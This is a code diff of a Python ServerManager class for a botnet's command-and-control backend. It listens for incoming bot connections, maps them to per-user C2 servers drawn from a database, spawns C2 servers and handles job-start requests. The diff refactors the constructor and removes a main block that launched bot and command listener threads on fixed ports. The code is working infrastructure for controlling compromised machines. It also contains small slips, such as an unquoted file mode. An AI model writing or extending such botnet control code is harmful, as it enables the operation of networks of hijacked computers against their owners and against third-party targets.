@@ -12,13 +12,11 @@ from botnet_exceptions import *
 
 
 class ServerManager():
-    def __init__(self, command_entry_address, bot_entry_address):
-        self.command_entry_address = command_entry_address
-        self.bot_entry_address = bot_entry_address
-        self.bot_clusters = {}
+    def __init__(self):
         self.commands_in_process = []
         self.c2servers = {}
         self.connection_string = self.get_connection_string("botnet")
+
 
     def get_connection_string(self, database):
         f = open("databaseconfig.json", r)
@@ -33,8 +31,10 @@ class ServerManager():
 
         return "Driver="+driver+";Server="+server+";Database="+database+";UID="+uid+";PWD="+pwd+";"
 
+
     def start_job(self, request):
         try:
+            # TODO: maybe this doesn't work (does function return same object?)
             c2server = self.c2servers[request.userId]
         except KeyError:
             c2server = self.spawn_c2server(request.userId)
@@ -44,14 +44,16 @@ class ServerManager():
         except:
             response = c2_pb2.StartJobResponse()
             response.response = c2_pb2.StartJobResponse.Response.FAIL
+
         return response
 
-    def listen_for_bots(self):
+
+    def listen_for_bots(self, bot_entry_address):
         """
         Listen for incoming bots
         :return: None
         """
-        bots_socket = self.create_listen_socket(self.bot_entry_address)
+        bots_socket = self.create_listen_socket(bot_entry_address)
 
         while True:
             try:
@@ -76,21 +78,26 @@ class ServerManager():
                 row = cursor.fetchone()
                 user_id = row[1]
 
-                c2server = does_c2server_exist(user_id)
-                if c2server is None:
-                    self.spawn_c2server(user_id, bot_socket)
-                else:
-                    c2server.bots.append(bot_socket)
+                try:
+                    c2server = self.c2servers[user_id]
+                except KeyError:
+                    c2server = self.spawn_c2server(user_id)
 
-    def spawn_c2server(self, user_id, bot=None):
+                bot = Bot(bot_address, bot_socket, user_id)
+
+                c2server.add_bot(bot)
+
+
+    def spawn_c2server(self, user_id):
         """
         Spawn new C2 server when no available bot cluster is present
         :param user_id: str
         :return: C2server
         """
-        c2server = C2server(user_id, bot) if bot else C2server(user_id)
+        c2server = C2server(user_id)
         self.c2servers[user_id] = c2server
         return c2server
+
 
     def create_listen_socket(self, address):
         try:
@@ -103,16 +110,4 @@ class ServerManager():
             sys.exit()
 
         return commands_socket
-
-
-
-if __name__ == "__main__":
-    command_entry_address = ('', 4590)
-    bot_entry_address = ('', 4591)
-    serverManager = ServerManager(command_entry_address, bot_entry_address)
-    command_thread = threading.Thread(target=serverManager.listen_for_commands)
-    command_thread.start()
-    bot_thread = threading.Thread(target=serverManager.listen_for_bots)
-    bot_thread.start()
-
 
